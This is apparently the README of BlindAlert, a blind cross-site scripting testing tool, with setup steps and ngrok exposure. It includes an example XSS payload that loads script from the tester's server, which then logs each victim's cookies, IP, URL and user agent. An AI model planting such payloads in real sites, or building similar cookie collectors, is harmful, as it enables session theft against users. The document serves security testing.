# BlindAlert

![BlindAlert](https://image.ibb.co/iHB1Dx/blind_Alert.png)

Easy Blind Cross-site Scripting testing tool.

## Requirements

* PHP >= 5.7
* Running server or [ngrok](https://ngrok.com/) (access localhost over the internet)

## Installation

Either you can install in your local system and access through the ngrok or install into a live server.

To install BlindAlert, simply clone the repo
```
git clone https://github.com/mdhama/blindAlert.git
```

To Run on local server
```
cd blindAlert
php -S localhost:80
```
Now open http://localhost in your browser.

Over the internet using ngrok
```
./ngrok http 80
```


## Uses

- Create a JS payload and start blindly putting into endpoints :-) 
`e.g. "><script src="http://localhost"></script>`
- When it executes sucessfully, it creates an output file within the same project directory. 

Example output file.txt: 

```
origin: http://example
host: example
url: http://example/user/posts
referrer: http://example/user
user-agent: <user-agent>
cookies: <document.cookie>
ip: <ip_addess>
```
